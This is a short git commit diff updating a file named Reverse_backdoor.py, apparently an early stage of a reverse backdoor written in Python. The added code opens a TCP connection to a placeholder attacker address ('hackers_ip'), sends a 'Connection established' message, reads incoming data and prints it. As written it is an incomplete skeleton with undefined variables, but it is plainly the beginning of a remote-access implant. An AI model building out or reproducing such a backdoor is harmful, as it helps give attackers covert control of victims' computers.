d7388bd615c656864b440a2f11d0ffdfee5f8830
Shivam Singh <dreamyshivam01@gmail.com>
2025-03-19 22:00:50 +0530

    Update Reverse_backdoor.py

--- Reverse_backdoor.py
+++ Reverse_backdoor.py
@@ -1,4 +1,13 @@
 import socket 
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("hackers_ip", open_port))
+
+connection.connect(("hackers_ip", open_port_no ))
+
+connection.send("\n[+] Connection established.\n")
+
+received_data = connection.recv(1024)
+
+print(received_data)
+
+connection.close()
